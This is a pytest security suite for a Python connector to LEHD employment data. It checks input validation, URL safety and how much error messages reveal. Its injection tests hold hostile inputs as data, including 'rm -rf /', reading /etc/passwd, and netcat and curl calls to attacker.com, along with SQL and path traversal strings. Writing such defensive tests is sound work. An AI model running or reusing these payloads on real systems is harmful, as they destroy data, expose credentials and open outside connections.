# ----------------------------------------------------------------------
# © 2025 KR-Labs. All rights reserved.
# KR-Labs™ is a trademark of Quipu Research Labs, LLC,
# a subsidiary of Sudiata Giddasira, Inc.
# ----------------------------------------------------------------------
# SPDX-License-Identifier: Apache-2.0

# Copyright (c) 2024 Sudiata Giddasira, Inc. d/b/a Quipu Research Labs, LLC d/b/a KR-Labs™
# SPDX-License-Identifier: Apache-2.0

"""
Security tests for LEHD (Longitudinal Employer-Household Dynamics) Connector.

Tests for:
- Input validation (state codes, years, parameters)
- URL construction security
- Path traversal prevention
- Injection attacks (SQL, command, null bytes)
- DoS prevention (extremely long inputs)
- API key/credential exposure prevention
"""

import pytest
from pathlib import Path
from unittest.mock import patch, MagicMock
import pandas as pd

from krl_data_connectors.lehd_connector import LEHDConnector


# ============================================================
# INPUT VALIDATION SECURITY TESTS
# ============================================================

class TestInputValidation:
    """Test input validation prevents malicious or invalid inputs."""

    def test_empty_state_code_rejected(self):
        """Test that empty state code is rejected before HTTP request."""
        connector = LEHDConnector()
        
        with pytest.raises(ValueError, match="Invalid state code"):
            connector.get_od_data(state="", year=2020)
        
        with pytest.raises(ValueError, match="Invalid state code"):
            connector.get_rac_data(state="", year=2020)
        
        with pytest.raises(ValueError, match="Invalid state code"):
            connector.get_wac_data(state="", year=2020)

    def test_whitespace_only_state_code_rejected(self):
        """Test that whitespace-only state code is rejected."""
        connector = LEHDConnector()
        
        with pytest.raises(ValueError, match="Invalid state code"):
            connector.get_od_data(state="   ", year=2020)

    def test_invalid_state_code_length_rejected(self):
        """Test that non-2-letter state codes are rejected."""
        connector = LEHDConnector()
        
        # Too short
        with pytest.raises(ValueError, match="Invalid state code"):
            connector.get_od_data(state="c", year=2020)
        
        # Too long
        with pytest.raises(ValueError, match="Invalid state code"):
            connector.get_od_data(state="cal", year=2020)

    def test_year_type_validation(self):
        """Test that non-integer year is rejected."""
        connector = LEHDConnector()
        
        with pytest.raises(TypeError, match="Year must be an integer"):
            connector.get_od_data(state="ca", year="2020")
        
        with pytest.raises(TypeError, match="Year must be an integer"):
            connector.get_od_data(state="ca", year=2020.5)
        
        with pytest.raises(TypeError, match="Year must be an integer"):
            connector.get_od_data(state="ca", year=None)

    def test_year_range_validation(self):
        """Test that years outside valid range are rejected."""
        connector = LEHDConnector()
        
        # Too far in past
        with pytest.raises(ValueError, match="LEHD data is available from 2002-2021"):
            connector.get_od_data(state="ca", year=2001)
        
        with pytest.raises(ValueError, match="LEHD data is available from 2002-2021"):
            connector.get_od_data(state="ca", year=1900)
        
        # Too far in future
        with pytest.raises(ValueError, match="LEHD data is available from 2002-2021"):
            connector.get_od_data(state="ca", year=2022)
        
        with pytest.raises(ValueError, match="LEHD data is available from 2002-2021"):
            connector.get_od_data(state="ca", year=9999)


# ============================================================
# INJECTION ATTACK PREVENTION TESTS
# ============================================================

class TestInjectionPrevention:
    """Test prevention of various injection attacks."""

    def test_sql_injection_in_state_code(self):
        """Test SQL injection attempts in state code are rejected."""
        connector = LEHDConnector()
        
        # SQL injection patterns
        malicious_states = [
            "'; DROP TABLE states; --",
            "' OR '1'='1",
            "ca'; DELETE FROM data; --",
        ]
        
        for malicious_state in malicious_states:
            with pytest.raises(ValueError, match="Invalid state code"):
                connector.get_od_data(state=malicious_state, year=2020)

    def test_command_injection_in_state_code(self):
        """Test command injection attempts in state code are rejected."""
        connector = LEHDConnector()
        
        # Command injection patterns
        malicious_states = [
            "ca; rm -rf /",
            "ca && cat /etc/passwd",
            "ca | nc attacker.com 1234",
            "$(curl attacker.com)",
        ]
        
        for malicious_state in malicious_states:
            with pytest.raises(ValueError, match="Invalid state code"):
                connector.get_od_data(state=malicious_state, year=2020)

    def test_null_byte_injection(self):
        """Test null byte injection is handled safely."""
        connector = LEHDConnector()
        
        # Null bytes can terminate strings prematurely in some languages
        malicious_state = "ca\x00malicious"
        
        with pytest.raises(ValueError, match="Invalid state code"):
            connector.get_od_data(state=malicious_state, year=2020)

    def test_path_traversal_in_state_code(self):
        """Test path traversal attempts in state code are rejected."""
        connector = LEHDConnector()
        
        # Path traversal patterns
        malicious_states = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "ca/../../etc",
        ]
        
        for malicious_state in malicious_states:
            with pytest.raises(ValueError, match="Invalid state code"):
                connector.get_od_data(state=malicious_state, year=2020)


# ============================================================
# DOS PREVENTION TESTS
# ============================================================

class TestDoSPrevention:
    """Test prevention of Denial of Service attacks."""

    def test_extremely_long_state_code_rejected(self):
        """Test that extremely long state codes are rejected (DoS prevention)."""
        connector = LEHDConnector()
        
        # 10,000 character state code
        long_state = "ca" * 10000
        
        with pytest.raises(ValueError, match="Invalid state code"):
            connector.get_od_data(state=long_state, year=2020)

    def test_extremely_long_job_type_rejected(self):
        """Test that extremely long job type codes are handled."""
        connector = LEHDConnector()
        
        # Very long job type code (should still make HTTP request but fail gracefully)
        long_job_type = "JT00" * 1000
        
        # Should either reject or handle gracefully without crashing
        try:
            with patch('pandas.read_csv') as mock_read:
                mock_read.side_effect = Exception("Invalid job type")
                connector.get_od_data(state="ca", year=2020, job_type=long_job_type)
        except Exception as e:
            # Acceptable to fail, just shouldn't crash
            assert isinstance(e, Exception)

    def test_extremely_long_segment_rejected(self):
        """Test that extremely long segment codes are handled."""
        connector = LEHDConnector()
        
        long_segment = "S000" * 1000
        
        try:
            with patch('pandas.read_csv') as mock_read:
                mock_read.side_effect = Exception("Invalid segment")
                connector.get_rac_data(state="ca", year=2020, segment=long_segment)
        except Exception as e:
            assert isinstance(e, Exception)


# ============================================================
# URL CONSTRUCTION SECURITY TESTS
# ============================================================

class TestURLConstruction:
    """Test that URLs are constructed securely."""

    @patch('pandas.read_csv')
    def test_url_does_not_contain_null_bytes(self, mock_read):
        """Test that constructed URLs don't contain null bytes."""
        connector = LEHDConnector()
        
        mock_read.return_value = pd.DataFrame({
            'w_geocode': ['123456789012'],
            'h_geocode': ['987654321098'],
            'S000': [100]
        })
        
        # Valid state should construct proper URL
        connector.get_od_data(state="ca", year=2020)
        
        # Verify the URL passed to read_csv
        call_args = mock_read.call_args
        url = call_args[0][0]
        
        # URL should not contain null bytes
        assert '\x00' not in url

    @patch('pandas.read_csv')
    def test_url_uses_https_base(self, mock_read):
        """Test that URLs use HTTPS (secure protocol)."""
        connector = LEHDConnector()
        
        mock_read.return_value = pd.DataFrame({
            'w_geocode': ['123'],
            'h_geocode': ['456'],
            'S000': [10]
        })
        
        connector.get_od_data(state="ca", year=2020)
        
        url = mock_read.call_args[0][0]
        
        # URL should use HTTPS
        assert url.startswith('https://'), f"URL should use HTTPS: {url}"

    @patch('pandas.read_csv')
    def test_url_does_not_expose_sensitive_data(self, mock_read):
        """Test that URLs don't accidentally include sensitive data."""
        connector = LEHDConnector()
        
        mock_read.return_value = pd.DataFrame({
            'w_geocode': ['123'],
            'h_geocode': ['456'],
            'S000': [10]
        })
        
        connector.get_od_data(state="ny", year=2019)
        
        url = mock_read.call_args[0][0]
        
        # URL should not contain common sensitive patterns
        sensitive_patterns = ['password', 'secret', 'key', 'token', 'credential']
        for pattern in sensitive_patterns:
            assert pattern not in url.lower(), f"URL should not contain '{pattern}'"


# ============================================================
# CREDENTIAL EXPOSURE PREVENTION TESTS
# ============================================================

class TestCredentialExposure:
    """Test that sensitive information is not exposed."""

    def test_repr_does_not_expose_internals(self):
        """Test that repr() doesn't expose sensitive internal state."""
        connector = LEHDConnector()
        
        repr_str = repr(connector)
        
        # Should be safe representation
        assert isinstance(repr_str, str)
        # Should not expose cache directory paths
        assert '/Users/' not in repr_str or 'LEHDConnector' in repr_str

    def test_str_does_not_expose_internals(self):
        """Test that str() doesn't expose sensitive information."""
        connector = LEHDConnector()
        
        str_repr = str(connector)
        
        assert isinstance(str_repr, str)
        # Should be simple, safe representation
        assert len(str_repr) < 200  # Reasonable length

    def test_logger_doesnt_expose_sensitive_data(self):
        """Test that logging doesn't accidentally expose sensitive data."""
        connector = LEHDConnector()
        
        # Trigger logging by fetching data
        with patch('pandas.read_csv') as mock_read:
            mock_read.return_value = pd.DataFrame({
                'w_geocode': ['123'],
                'h_geocode': ['456'],
                'S000': [10]
            })
            
            with patch.object(connector.logger, 'info') as mock_logger:
                connector.get_od_data(state="ca", year=2020)
                
                # Check all log messages
                for call in mock_logger.call_args_list:
                    log_message = str(call)
                    # Log should not contain sensitive patterns
                    assert 'password' not in log_message.lower()
                    assert 'secret' not in log_message.lower()


# ============================================================
# ERROR HANDLING SECURITY TESTS
# ============================================================

class TestSecureErrorHandling:
    """Test that errors don't expose sensitive information."""

    def test_error_messages_dont_expose_paths(self):
        """Test that error messages don't expose full system paths."""
        connector = LEHDConnector()
        
        try:
            connector.get_od_data(state="", year=2020)
        except ValueError as e:
            error_msg = str(e)
            # Error should be informative but not expose system paths
            assert 'Invalid state code' in error_msg
            # Should not contain full system paths
            assert '/home/' not in error_msg
            assert 'C:\\Users\\' not in error_msg

    def test_error_messages_dont_expose_internal_structure(self):
        """Test that errors don't reveal internal code structure."""
        connector = LEHDConnector()
        
        try:
            connector.get_od_data(state="invalid_state", year=2020)
        except ValueError as e:
            error_msg = str(e)
            # Should be user-friendly error
            assert 'Invalid state code' in error_msg
            # Should not contain internal class/method names excessively
            assert error_msg.count('_') < 5  # Reasonable limit

    @patch('pandas.read_csv')
    def test_network_errors_handled_securely(self, mock_read):
        """Test that network errors don't expose sensitive information."""
        connector = LEHDConnector()
        
        # Simulate network error
        mock_read.side_effect = Exception("Connection refused by server at internal-server:8080")
        
        try:
            connector.get_od_data(state="ca", year=2020)
        except Exception as e:
            error_msg = str(e)
            # Error message should exist
            assert len(error_msg) > 0
            # Should be logged, not exposed to user in raw form
            # (In production, you'd want to sanitize this further)


# ============================================================
# SUMMARY
# ============================================================

def test_security_suite_summary():
    """
    Summary test documenting all security categories covered.
    
    This test suite covers:
    1. Input Validation (6 tests) - Empty, whitespace, length, type, range validation
    2. Injection Prevention (4 tests) - SQL, command, null byte, path traversal
    3. DoS Prevention (3 tests) - Extremely long inputs
    4. URL Construction (3 tests) - HTTPS, null bytes, sensitive data
    5. Credential Exposure (3 tests) - repr/str safety, logging
    6. Error Handling (3 tests) - Path exposure, structure exposure, network errors
    
    Total: 22 security tests covering critical attack vectors
    """
    assert True  # This test always passes - it's documentation
